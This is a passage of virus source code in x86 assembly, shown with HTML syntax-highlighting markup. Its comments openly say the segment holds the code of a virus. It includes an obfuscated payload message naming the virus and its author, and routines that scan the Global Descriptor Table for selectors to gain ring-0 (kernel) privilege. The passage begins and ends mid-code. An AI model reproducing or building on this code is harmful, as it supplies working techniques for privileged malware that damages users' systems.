 </span><span class="sc5">MSGCAPTION</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'#'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'V'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'I'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'R'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'U'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'Y'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'B'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'R'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'N'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'#'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">MSG</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'C'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'R'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'I'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'N'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'Q'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'U'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">'S'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'T'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'B'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">'M'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'U'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'R'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'T'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'O'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'N'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'O'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'?'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'?'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'?'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">'.'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'J'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'J'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">'A'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'J'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'J'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'^'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'^'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">'b'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'y'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'o'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'P'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">'i'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'n'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'K'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'y'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">'A'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'r'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'g'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'n'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">'i'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'n'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'^'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'^'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">'F'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'L'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'I'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'C'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">'S'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'F'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'I'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DB</span><span class="sc0">            </span><span class="sc12">'T'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">REFDATA</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'                                    '</span><span class="sc0">
 </span><span class="sc5">CONTFLAG</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">FIN_DATA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;_DATA ENDS</span><span class="sc0">





</span><span class="sc1">;;Code Segment (realy is data segment, but i use it for code of virus;;;;;</span><span class="sc0">

</span><span class="sc5">BEG_CODE</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;;ALL PROCS NEED TO HAVE DELTA OFFSET IN THE EBP REGISTER</span><span class="sc0">

</span><span class="sc1">;   DirectHACKERS                         </span><span class="sc0">
</span><span class="sc1">;-----------------------------Init the variables in DirectH----------------------------;</span><span class="sc0">
</span><span class="sc1">;--En caso de error EBP+CS0 = 0 y EBP+DS0=0</span><span class="sc0">
</span><span class="sc5">InitDirectH</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">sgdt</span><span class="sc0">    </span><span class="sc10">FWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">GDT</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc1">;get the base and limit in the gdt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GDT</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc5">.base</span><span class="sc0"> </span><span class="sc1">;get the dir in EAX for scan the gdt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GDT</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc5">.limite</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">bucle_serch_cs</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;;serch!!</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Descriptor.Limit_L</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_paso_cs</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Descriptor.Base_L</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_paso_cs</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Descriptor.Base_M</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_paso_cs</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Descriptor.access</span><span class="sc4">,</span><span class="sc2">9bh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_paso_cs</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Descriptor.Limit_H</span><span class="sc4">,</span><span class="sc2">0cfh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_paso_cs</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Descriptor.Base_H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_paso_cs</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">paso_cs</span><span class="sc0">
</span><span class="sc5">no_paso_cs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">bucle_serch_cs</span><span class="sc0">
</span><span class="sc5">paso_cs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ERRORRR</span><span class="sc0"> </span><span class="sc1">;;If the serch not found apropiated Selectors to Ring 0 (it never hapens, hahaha)</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">CS0</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">  </span><span class="sc1">;;CS0 Finded</span><span class="sc0">

</span><span class="sc1">;;;;;Serch GDT for find DS Apropiated</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GDT</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc5">.base</span><span class="sc0"> </span><span class="sc1">;cargo la direccion en EAX para serchear la gdt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GDT</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc5">.limite</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                
</span><span class="sc5">bucle_serch_ds</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Descriptor.Limit_L</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_paso_ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Descriptor.Base_L</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_paso_ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Descriptor.Base_M</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_paso_ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Descriptor.access</span><span class="sc4">,</span><span class="sc2">93h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_paso_ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Descriptor.Limit_H</span><span class="sc4">,</span><span class="sc2">0cfh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_paso_ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.Descriptor.Base_H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_paso_ds</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">paso_ds</span><span class="sc0">
</span><span class="sc5">no_paso_ds</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">bucle_serch_ds</span><span class="sc0">

</span><span class="sc5">paso_ds</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ERRORRR</span><span class="sc0"> </span><span class="sc1">;;if they arent apropiate selectors</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">DS0</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">  </span><span class="sc1">;;DS Finded</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">ES0</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">FS0</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">GS0</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">  
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ERRORRR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;;;;;Error :(..... (it Never Happens, i had comproved :) )</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">CS0</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">DS0</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">ES0</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">FS0</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">GS0</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">InitDirectH</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc1">;;Call Ring 0 Proc</span><span class="sc0">
</span><span class="sc1">;---EAX=offset of the to call, !Warning! the offset is the real in other</span><span class="sc0">
</span><span class="sc1">;       words: EAX= deltaoffset+offset Proc</span><span class="sc0">
</span><span class="sc5">CallRing0</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GDT</span><span class="sc4">+</span><span class="sc8">EBP</span><span class="sc4">]</span><span class="sc5">.base</span><span class="sc0"> </span><span class="sc1">;Get the addres of GDT in EAX </span><span class="sc0">
